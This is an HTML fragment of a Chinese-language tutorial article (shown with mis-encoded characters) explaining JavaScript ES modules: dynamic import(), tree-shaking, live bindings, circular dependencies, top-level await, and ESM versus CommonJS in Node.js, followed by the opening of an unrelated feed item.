<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// âœ… æ¡ä»¶åŠ è½½</span>
<span class="hljs-keyword">if</span> (condition) {
  <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">"./module.js"</span>);
}

<span class="hljs-comment">// âœ… å‡½æ•°å†…ä½¿ç”¨</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadModule</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> express = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">"express"</span>);
  <span class="hljs-keyword">return</span> express.<span class="hljs-property">default</span>;
}

<span class="hljs-comment">// âœ… åŠ¨æ€è·¯å¾„</span>
<span class="hljs-keyword">const</span> env = <span class="hljs-string">"production"</span>;
<span class="hljs-keyword">const</span> config = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">`./config.<span class="hljs-subst">${env}</span>.js`</span>);

<span class="hljs-comment">// âœ… æŒ‰éœ€åŠ è½½ï¼ˆä»£ç åˆ†å‰²ï¼‰</span>
button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"click"</span>, <span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">const</span> { <span class="hljs-title class_">Chart</span> } = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">"./chart.js"</span>);
  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Chart</span>(data);
});
</code></pre>
<p><strong>è¿”å›å€¼</strong>ï¼šModule Namespace Objectï¼ˆæ¨¡å—å‘½åç©ºé—´å¯¹è±¡ï¼‰</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// math.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">add</span> = (<span class="hljs-params">a, b</span>) =&gt; a + b;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">multiply</span>(<span class="hljs-params">a, b</span>) {
  <span class="hljs-keyword">return</span> a * b;
}

<span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">"./math.js"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">module</span>);
<span class="hljs-comment">// {</span>
<span class="hljs-comment">//   add: [Function: add],</span>
<span class="hljs-comment">//   default: [Function: multiply]</span>
<span class="hljs-comment">// }</span>

<span class="hljs-variable language_">module</span>.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">// 3</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-title function_">default</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>); <span class="hljs-comment">// 6</span>
</code></pre>
<h4 data-id="heading-23">é™æ€å¯¼å…¥ vs åŠ¨æ€å¯¼å…¥</h4>













































<table><thead><tr><th>ç‰¹æ€§</th><th>é™æ€å¯¼å…¥ <code>import</code></th><th>åŠ¨æ€å¯¼å…¥ <code>import()</code></th></tr></thead><tbody><tr><td>è¯­æ³•</td><td>å£°æ˜è¯­å¥</td><td>å‡½æ•°è°ƒç”¨ï¼ˆè¿”å› Promiseï¼‰</td></tr><tr><td>ä½¿ç”¨ä½ç½®</td><td>ä»…æ¨¡å—é¡¶å±‚</td><td>ä»»æ„ä½ç½®ï¼ˆå‡½æ•°ã€ä»£ç å—ç­‰ï¼‰</td></tr><tr><td>è·¯å¾„</td><td>å¿…é¡»æ˜¯é™æ€å­—ç¬¦ä¸²</td><td>å¯ä»¥æ˜¯åŠ¨æ€è¡¨è¾¾å¼</td></tr><tr><td>æ‰§è¡Œæ—¶æœº</td><td>Construction é˜¶æ®µ</td><td>è¿è¡Œæ—¶ï¼ˆEvaluation é˜¶æ®µï¼‰</td></tr><tr><td>Tree-shaking</td><td>âœ… æ”¯æŒ</td><td>âŒ ä¸æ”¯æŒ</td></tr><tr><td>æ¡ä»¶åŠ è½½</td><td>âŒ ä¸æ”¯æŒ</td><td>âœ… æ”¯æŒ</td></tr><tr><td>è¿”å›å€¼</td><td>ç›´æ¥ç»‘å®šå¯¼å‡ºå€¼</td><td>Promise</td></tr></tbody></table>
<blockquote>
<p><strong>å®˜æ–¹æ–‡æ¡£</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftc39.es%2Fproposal-dynamic-import%2F" target="_blank" title="https://tc39.es/proposal-dynamic-import/" ref="nofollow noopener noreferrer">TC39: import()</a></p>
</blockquote>
<h3 data-id="heading-24">é™æ€ç»“æ„</h3>
<p>ESM çš„ é™æ€<code>import/export</code> å£°æ˜å…·æœ‰é™æ€ç»“æ„ï¼Œåœ¨ä»£ç æ‰§è¡Œå‰å°±èƒ½ç¡®å®šæ¨¡å—ä¾èµ–å…³ç³»ã€‚è¿™ä½¿å¾—ç¼–è¯‘å™¨å’Œæ‰“åŒ…å·¥å…·èƒ½åœ¨ Construction é˜¶æ®µè¿›è¡Œ<strong>é™æ€åˆ†æ</strong>ï¼Œå¸¦æ¥è¯¸å¤šä¼˜åŒ–ã€‚</p>
<p><strong>1. Tree-shakingï¼ˆæ ‘æ‘‡ä¼˜åŒ–ï¼‰</strong></p>
<p>æ‰“åŒ…å·¥å…·èƒ½è¯†åˆ«æœªä½¿ç”¨çš„å¯¼å‡ºï¼Œç§»é™¤æ­»ä»£ç ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// utils.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>) {
  <span class="hljs-keyword">return</span> a + b;
}
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">subtract</span>(<span class="hljs-params">a, b</span>) {
  <span class="hljs-keyword">return</span> a - b;
} <span class="hljs-comment">// æœªè¢«ä½¿ç”¨</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">multiply</span>(<span class="hljs-params">a, b</span>) {
  <span class="hljs-keyword">return</span> a * b;
} <span class="hljs-comment">// æœªè¢«ä½¿ç”¨</span>

<span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">import</span> { add } <span class="hljs-keyword">from</span> <span class="hljs-string">"./utils.js"</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>));

<span class="hljs-comment">// æ‰“åŒ…åï¼šsubtract å’Œ multiply è¢«ç§»é™¤</span>
</code></pre>
<p><strong>2. å¾ªç¯ä¾èµ–æ£€æµ‹</strong></p>
<p>æ„å»ºå·¥å…·èƒ½åœ¨ç¼–è¯‘æ—¶æ£€æµ‹å¾ªç¯ä¾èµ–ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// a.js</span>
<span class="hljs-keyword">import</span> { b } <span class="hljs-keyword">from</span> <span class="hljs-string">"./b.js"</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> a = <span class="hljs-number">1</span>;

<span class="hljs-comment">// b.js</span>
<span class="hljs-keyword">import</span> { a } <span class="hljs-keyword">from</span> <span class="hljs-string">"./a.js"</span>; <span class="hljs-comment">// å¾ªç¯ä¾èµ–</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> b = <span class="hljs-number">2</span>;

<span class="hljs-comment">// æ„å»ºå·¥å…·å¯åœ¨ç¼–è¯‘æ—¶å‘å‡ºè­¦å‘Š</span>
</code></pre>
<p><strong>3. å¯¼å‡ºéªŒè¯</strong></p>
<p>åœ¨ Instantiation é˜¶æ®µéªŒè¯æ‰€æœ‰å¯¼å…¥æ˜¯å¦æœ‰å¯¹åº”çš„å¯¼å‡ºã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// math.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">add</span> = (<span class="hljs-params">a, b</span>) =&gt; a + b;

<span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">import</span> { add, subtract } <span class="hljs-keyword">from</span> <span class="hljs-string">"./math.js"</span>;
<span class="hljs-comment">// é”™è¯¯ï¼šInstantiation é˜¶æ®µæŠ¥é”™</span>
<span class="hljs-comment">// SyntaxError: The requested module './math.js' does not provide an export named 'subtract'</span>
</code></pre>
<h3 data-id="heading-25">å€¼å®æ—¶ç»‘å®šï¼Œä¸èƒ½åœ¨å¯¼å…¥åè¢«ä¿®æ”¹</h3>
<p>ESM çš„å¯¼å‡ºå’Œå¯¼å…¥å»ºç«‹<strong>å®æ—¶ç»‘å®šï¼ˆLive Bindingsï¼‰</strong>ï¼šimport å’Œ export æŒ‡å‘å†…å­˜ä¸­çš„åŒä¸€ä½ç½®ï¼Œå¯¼å‡ºæ¨¡å—ä¿®æ”¹å€¼æ—¶ï¼Œå¯¼å…¥æ¨¡å—èƒ½å®æ—¶çœ‹åˆ°å˜åŒ–ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// counter.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">increment</span>(<span class="hljs-params"/>) {
  count++;
}

<span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">import</span> { count, increment } <span class="hljs-keyword">from</span> <span class="hljs-string">"./counter.js"</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count); <span class="hljs-comment">// 0</span>
<span class="hljs-title function_">increment</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count); <span class="hljs-comment">// 1 - å®æ—¶çœ‹åˆ°å˜åŒ–</span>

<span class="hljs-comment">// âŒ å¯¼å…¥çš„ç»‘å®šæ˜¯åªè¯»çš„</span>
count = <span class="hljs-number">10</span>; <span class="hljs-comment">// TypeError: Assignment to constant variable</span>
</code></pre>
<p><strong>åŸç†</strong>ï¼šåœ¨ Instantiation é˜¶æ®µï¼Œ<code>count</code> åœ¨å†…å­˜ä¸­åªæœ‰ä¸€ä»½ï¼Œimport å’Œ export éƒ½æŒ‡å‘è¿™ä¸ªä½ç½®ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[counter.js: export count] --&gt;|æŒ‡å‘| C[å†…å­˜åœ°å€ 0x1234]
    B[main.js: import count] --&gt;|æŒ‡å‘| C
    D[counter.js: increment ä¿®æ”¹ count] --&gt;|ä¿®æ”¹| C
</code></pre>
<blockquote>
<p><strong>å®˜æ–¹æ–‡æ¡£</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftc39.es%2Fecma262%2F%23sec-module-environment-records" target="_blank" title="https://tc39.es/ecma262/#sec-module-environment-records" ref="nofollow noopener noreferrer">TC39: Module Environment Records</a> | <a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fapi%2Fmodules.html%23cycles" target="_blank" title="https://nodejs.org/api/modules.html#cycles" ref="nofollow noopener noreferrer">Node.js: Modules: Cycles</a></p>
</blockquote>
<h3 data-id="heading-26">å¾ªç¯ä¾èµ–å¤„ç†</h3>
<p>ESM é€šè¿‡<strong>å®æ—¶ç»‘å®š</strong>å’Œ<strong>ä¸‰é˜¶æ®µåŠ è½½</strong>ä¼˜é›…åœ°å¤„ç†å¾ªç¯ä¾èµ–ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// a.js</span>
<span class="hljs-keyword">import</span> { b } <span class="hljs-keyword">from</span> <span class="hljs-string">"./b.js"</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">let</span> a = <span class="hljs-string">"a"</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"a.js:"</span>, b);

<span class="hljs-comment">// b.js</span>
<span class="hljs-keyword">import</span> { a } <span class="hljs-keyword">from</span> <span class="hljs-string">"./a.js"</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">let</span> b = <span class="hljs-string">"b"</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"b.js:"</span>, a); <span class="hljs-comment">// ReferenceError: Cannot access 'a' before initialization</span>

<span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">"./a.js"</span>;
</code></pre>
<p><strong>æ‰§è¡Œæµç¨‹</strong>ï¼š</p>
<ol>
<li><strong>Construction é˜¶æ®µ</strong>ï¼šæ„å»ºæ¨¡å—å›¾ï¼Œ<code>main.js</code> â†’ <code>a.js</code> â†’ <code>b.js</code></li>
<li><strong>Instantiation é˜¶æ®µ</strong>ï¼š
<ul>
<li>ä¸º <code>a.js</code> çš„ <code>a</code> åœ¨å†…å­˜ä¸­åˆ†é…ç©ºé—´ï¼ˆæœªèµ‹å€¼ï¼‰</li>
<li>ä¸º <code>b.js</code> çš„ <code>b</code> åœ¨å†…å­˜ä¸­åˆ†é…ç©ºé—´ï¼ˆæœªèµ‹å€¼ï¼‰</li>
<li>å»ºç«‹å®æ—¶ç»‘å®šï¼š<code>a.js</code> çš„ import ç»‘å®šåˆ° <code>b.js</code> çš„ exportï¼Œåä¹‹äº¦ç„¶</li>
</ul>
</li>
<li><strong>Evaluation é˜¶æ®µ</strong>ï¼ˆæ·±åº¦ä¼˜å…ˆååºéå†ï¼‰ï¼š
<ul>
<li>å…ˆæ‰§è¡Œ <code>b.js</code>ï¼šæ­¤æ—¶ <code>a</code> è¿˜æœªèµ‹å€¼ï¼Œç›´æ¥æŠ¥é”™ <code>Cannot access 'a' before initialization</code></li>
</ul>
</li>
</ol>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ul>
<li>Instantiation é˜¶æ®µå·²å»ºç«‹æ‰€æœ‰ç»‘å®šå…³ç³»</li>
<li>Evaluation é˜¶æ®µåªæ˜¯å¡«å……å€¼</li>
<li>å®æ—¶ç»‘å®šï¼Œå¹¶ä¸”è¢«åˆå§‹åŒ–åï¼Œæ‰èƒ½è®¿é—®åˆ°æ­£ç¡®çš„å€¼</li>
</ul>
<h3 data-id="heading-27">æ”¯æŒ top-level await</h3>
<p>ESM æ”¯æŒåœ¨æ¨¡å—é¡¶å±‚ç›´æ¥ä½¿ç”¨ <code>await</code>ï¼Œæ— éœ€åŒ…è£¹åœ¨ async å‡½æ•°ä¸­ã€‚CJS æ¨¡å—è¢«åŒ…è£…åœ¨æ™®é€šå‡½æ•°ä¸­æ‰§è¡Œï¼Œä¸æ”¯æŒ top-level awaitã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// data.js</span>
<span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">"https://api.example.com/data"</span>);
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();

<span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">import</span> { data } <span class="hljs-keyword">from</span> <span class="hljs-string">"./data.js"</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data); <span class="hljs-comment">// ç­‰å¾… data.js å®Œæˆåæ‰§è¡Œ</span>
</code></pre>
<p><strong>æ‰§è¡Œæ—¶æœº</strong>ï¼š</p>
<ul>
<li>top-level await åœ¨ <strong>Evaluation é˜¶æ®µ</strong>æ‰§è¡Œ</li>
<li>å½“å‰æ¨¡å—ä¼šæš‚åœï¼Œç­‰å¾… Promise å®Œæˆ</li>
<li>ä¾èµ–å½“å‰æ¨¡å—çš„çˆ¶æ¨¡å—ä¹Ÿä¼šç­‰å¾…</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[main.js: import data.js] --&gt; B[Construction: æ„å»ºæ¨¡å—å›¾]
    B --&gt; C[Instantiation: å»ºç«‹ç»‘å®š]
    C --&gt; D[Evaluation: æ‰§è¡Œ data.js]
    D --&gt; E[data.js: await fetch...]
    E --&gt; F[æš‚åœ, ç­‰å¾… Promise å®Œæˆ]
    F --&gt; G[Promise å®Œæˆ, ç»§ç»­æ‰§è¡Œ]
    G --&gt; H[data.js å®Œæˆ]
    H --&gt; I[æ‰§è¡Œ main.js]
</code></pre>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. åŠ¨æ€åŠ è½½é…ç½®</span>
<span class="hljs-keyword">const</span> config = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">`./config.<span class="hljs-subst">${process.env.NODE_ENV}</span>.js`</span>);
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> config;

<span class="hljs-comment">// 2. ç­‰å¾…æ•°æ®åº“è¿æ¥</span>
<span class="hljs-keyword">import</span> mongoose <span class="hljs-keyword">from</span> <span class="hljs-string">"mongoose"</span>;
<span class="hljs-keyword">await</span> mongoose.<span class="hljs-title function_">connect</span>(process.<span class="hljs-property">env</span>.<span class="hljs-property">DB_URL</span>);
<span class="hljs-keyword">export</span> { mongoose };

<span class="hljs-comment">// 3. æ¡ä»¶åŠ è½½ polyfill</span>
<span class="hljs-keyword">const</span> locale = navigator.<span class="hljs-property">language</span>;
<span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Intl</span>.<span class="hljs-property">PluralRules</span>) {
  <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">`https://cdn.example.com/polyfill/<span class="hljs-subst">${locale}</span>.js`</span>);
}
</code></pre>
<p><strong>æ³¨æ„äº‹é¡¹</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// âš ï¸ é˜»å¡æ•ˆåº”ï¼šæ‰€æœ‰ä¾èµ–æ­¤æ¨¡å—çš„æ¨¡å—éƒ½ä¼šç­‰å¾…</span>
<span class="hljs-comment">// slow-module.js</span>
<span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, <span class="hljs-number">5000</span>));
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> value = <span class="hljs-string">"done"</span>;

<span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">import</span> { value } <span class="hljs-keyword">from</span> <span class="hljs-string">"./slow-module.js"</span>; <span class="hljs-comment">// ç­‰å¾… 5 ç§’</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value);

<span class="hljs-comment">// âš ï¸ é”™è¯¯å¤„ç†ï¼šæœªæ•è·çš„ Promise rejection ä¼šå¯¼è‡´æ¨¡å—åŠ è½½å¤±è´¥</span>
<span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">"https://invalid-url.com/data"</span>); <span class="hljs-comment">// æ•´ä¸ªæ¨¡å—åŠ è½½å¤±è´¥</span>
</code></pre>
<h2 data-id="heading-28">å¸¸è§é—®é¢˜</h2>
<h3 data-id="heading-29">ESM ç›¸æ¯” CJS æœ‰ä»€ä¹ˆå¥½å¤„ï¼Ÿ</h3>
<p><strong>1. é™æ€åˆ†æï¼Œæ”¯æŒ Tree-shaking</strong></p>
<p>ESM çš„ <code>import/export</code> åœ¨ç¼–è¯‘æ—¶å°±èƒ½ç¡®å®šä¾èµ–å…³ç³»ï¼Œæ‰“åŒ…å·¥å…·å¯ä»¥ç§»é™¤æœªä½¿ç”¨çš„ä»£ç ï¼Œæ˜¾è‘—å‡å°æ‰“åŒ…ä½“ç§¯ã€‚CJS çš„ <code>require</code> æ˜¯è¿è¡Œæ—¶è°ƒç”¨ï¼Œæ— æ³•é™æ€åˆ†æã€‚</p>
<p><strong>2. åŸç”Ÿæ”¯æŒï¼Œæ— éœ€æ‰“åŒ…</strong></p>
<p>ESM æ˜¯ ECMAScript æ ‡å‡†ï¼Œæµè§ˆå™¨å’Œ Node.js åŸç”Ÿæ”¯æŒã€‚CJS éœ€è¦æ‰“åŒ…å·¥å…·ï¼ˆWebpackã€Browserifyï¼‰è½¬æ¢æ‰èƒ½åœ¨æµè§ˆå™¨è¿è¡Œã€‚</p>
<p><strong>3. å¼‚æ­¥åŠ è½½ï¼Œä¸é˜»å¡æ¸²æŸ“</strong></p>
<p>ESM åœ¨æµè§ˆå™¨ä¸­å¼‚æ­¥åŠ è½½ï¼Œä¸ä¼šé˜»å¡é¡µé¢æ¸²æŸ“ï¼ˆ<code>&lt;script type="module"&gt;</code> é»˜è®¤ deferï¼‰ã€‚CJS åŒæ­¥åŠ è½½ä¸é€‚åˆæµè§ˆå™¨ã€‚</p>
<p><strong>4. å®æ—¶ç»‘å®šï¼ŒåŠ¨æ€åæ˜ å˜åŒ–</strong></p>
<p>ESM çš„å¯¼å…¥å¯¼å‡ºæ˜¯å®æ—¶ç»‘å®šï¼Œå¯¼å‡ºæ¨¡å—ä¿®æ”¹å€¼æ—¶ï¼Œå¯¼å…¥æ¨¡å—èƒ½ç«‹å³çœ‹åˆ°å˜åŒ–ã€‚CJS æ˜¯å€¼æ‹·è´ï¼Œçœ‹ä¸åˆ°åç»­å˜åŒ–ã€‚</p>
<p><strong>5. æ”¯æŒ Top-level await</strong></p>
<p>ESM å¯ä»¥åœ¨æ¨¡å—é¡¶å±‚ç›´æ¥ä½¿ç”¨ <code>await</code>ï¼Œé€‚åˆå¼‚æ­¥åˆå§‹åŒ–åœºæ™¯ï¼ˆå¦‚æ•°æ®åº“è¿æ¥ã€é…ç½®åŠ è½½ï¼‰ã€‚CJS ä¸æ”¯æŒã€‚</p>
<p><strong>6. æ›´å¥½çš„å¾ªç¯ä¾èµ–å¤„ç†</strong></p>
<p>ESM é€šè¿‡å®æ—¶ç»‘å®šå¤„ç†å¾ªç¯ä¾èµ–ï¼Œè™½ç„¶è®¿é—®æœªåˆå§‹åŒ–å˜é‡ä¼šæŠ¥é”™ï¼ˆTDZï¼‰ï¼Œä½†æ›´å®¹æ˜“å‘ç°é—®é¢˜ã€‚CJS è¿”å›æœªå®Œæˆçš„ exportsï¼Œå®¹æ˜“äº§ç”Ÿéš¾ä»¥è°ƒè¯•çš„ bugã€‚</p>
<p><strong>7. ç»Ÿä¸€çš„æ¨¡å—æ ‡å‡†</strong></p>
<p>ESM æ˜¯æµè§ˆå™¨å’Œ Node.js é€šç”¨çš„æ ‡å‡†ï¼ŒåŒä¸€å¥—ä»£ç å¯ä»¥è·¨å¹³å°è¿è¡Œï¼Œæ— éœ€ç»´æŠ¤ä¸¤å¥—æ¨¡å—ç³»ç»Ÿã€‚</p>
<h3 data-id="heading-30">åœ¨ Node.js ä¸­ CJS å’Œ ESM èƒ½å¦äº’ç›¸å¼•ç”¨ï¼Ÿ</h3>
<p><strong>ESM å¼•ç”¨ CJS</strong>ï¼šâœ… æ”¯æŒ</p>
<p>ESM å¯ä»¥é€šè¿‡ <code>import</code> å¼•ç”¨ CJS æ¨¡å—ï¼ŒNode.js ä¼šå°† <code>module.exports</code> ä½œä¸ºé»˜è®¤å¯¼å‡ºã€‚</p>
<p><strong>CJS å¼•ç”¨ ESM</strong>ï¼šâŒ ä¸æ”¯æŒåŒæ­¥å¼•ç”¨</p>
<p>CJS çš„ <code>require</code> æ˜¯åŒæ­¥çš„ï¼Œæ— æ³•åŠ è½½å¼‚æ­¥çš„ ESM æ¨¡å—ã€‚å¿…é¡»ä½¿ç”¨åŠ¨æ€ <code>import()</code> å‡½æ•°ï¼ˆè¿”å› Promiseï¼‰ã€‚</p>
<blockquote>
<p><strong>å®˜æ–¹æ–‡æ¡£</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fapi%2Fesm.html%23interoperability-with-CJS" target="_blank" title="https://nodejs.org/api/esm.html#interoperability-with-CJS" ref="nofollow noopener noreferrer">Node.js: Interoperability with CJS</a></p>
</blockquote>
<h3 data-id="heading-31">Node ä¸­å¦‚ä½•åˆ¤æ–­ä¸€ä¸ª .js æ–‡ä»¶æ˜¯ CJS è¿˜æ˜¯ ESMï¼Ÿ</h3>
<p>Node.js é€šè¿‡ä»¥ä¸‹è§„åˆ™åˆ¤æ–­ï¼š</p>
<ol>
<li><strong>æ–‡ä»¶æ‰©å±•å</strong>ï¼š<code>.mjs</code> æ–‡ä»¶æ˜¯ ESMï¼Œ<code>.cjs</code> æ–‡ä»¶æ˜¯ CJS</li>
<li><strong>package.json çš„ type å­—æ®µ</strong>ï¼š
<ul>
<li><code>"type": "module"</code>ï¼š<code>.js</code> æ–‡ä»¶è§†ä¸º ESM</li>
<li><code>"type": "CJS"</code> æˆ–æ—  type å­—æ®µï¼š<code>.js</code> æ–‡ä»¶è§†ä¸º CJSï¼ˆé»˜è®¤ï¼‰</li>
</ul>
</li>
<li><strong>æŸ¥æ‰¾æœ€è¿‘çš„ package.json</strong>ï¼šä»å½“å‰æ–‡ä»¶å‘ä¸ŠæŸ¥æ‰¾æœ€è¿‘çš„ package.json</li>
</ol>
<blockquote>
<p><strong>å®˜æ–¹æ–‡æ¡£</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fapi%2Fpackages.html%23determining-module-system" target="_blank" title="https://nodejs.org/api/packages.html#determining-module-system" ref="nofollow noopener noreferrer">Node.js: Determining module system</a></p>
</blockquote>
<h3 data-id="heading-32">ESM å’Œ CJS çš„å·®å¼‚</h3>


















































<table><thead><tr><th>ç»´åº¦</th><th>CJS</th><th>ESM</th></tr></thead><tbody><tr><td>å®šä½</td><td>Node.js è¿è¡Œæ—¶æ¨¡å—ç³»ç»Ÿ</td><td>ECMAScript è¯­è¨€æ ‡å‡†</td></tr><tr><td>åŠ è½½æ—¶æœº</td><td>è¿è¡Œæ—¶ï¼ˆåŒæ­¥ï¼‰</td><td>ç¼–è¯‘æ—¶é™æ€åˆ†æ</td></tr><tr><td>è¯­æ³•</td><td><code>require</code> / <code>module.exports</code></td><td><code>import</code> / <code>export</code></td></tr><tr><td>å€¼çš„å¯¼å‡º</td><td>å€¼æ‹·è´ï¼ˆå¿«ç…§ï¼‰</td><td>å®æ—¶ç»‘å®šï¼ˆå¼•ç”¨ï¼‰</td></tr><tr><td>å¾ªç¯ä¾èµ–</td><td>è¿”å›æœªå®Œæˆçš„ exports</td><td>é€šè¿‡å®æ—¶ç»‘å®šå¤„ç†ï¼Œè®¿é—®æœªåˆå§‹åŒ–ä¼šæŠ¥é”™</td></tr><tr><td>Top-level await</td><td>âŒ ä¸æ”¯æŒ</td><td>âœ… æ”¯æŒ</td></tr><tr><td>Tree-shaking</td><td>âŒ ä¸æ”¯æŒ</td><td>âœ… æ”¯æŒ</td></tr><tr><td>åŠ¨æ€å¯¼å…¥</td><td>âœ… åŸç”Ÿæ”¯æŒï¼ˆ<code>require</code> æœ¬èº«ï¼‰</td><td>éœ€ä½¿ç”¨ <code>import()</code> å‡½æ•°</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Fastlane + Appuploader çš„å·¥ç¨‹ç»„åˆï¼Œè‡ªåŠ¨åŒ–å‘å¸ƒä¸­çš„åˆ†å·¥]]></title>    <link>https://juejin.cn/post/7583910637957644307</link>    <guid>https://juejin.cn/post/7583910637957644307</guid>    <pubDate>2025-12-15T09:47:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583910637957644307" data-draft-id="7583910637957627923" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Fastlane + Appuploader çš„å·¥ç¨‹ç»„åˆï¼Œè‡ªåŠ¨åŒ–å‘å¸ƒä¸­çš„åˆ†å·¥"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-15T09:47:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¼€å¿ƒå°±å¥½2025"/> <meta itemprop="url" content="https://juejin.cn/user/3850962908492660"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Fastlane + Appuploader çš„å·¥ç¨‹ç»„åˆï¼Œè‡ªåŠ¨åŒ–å‘å¸ƒä¸­çš„åˆ†å·¥
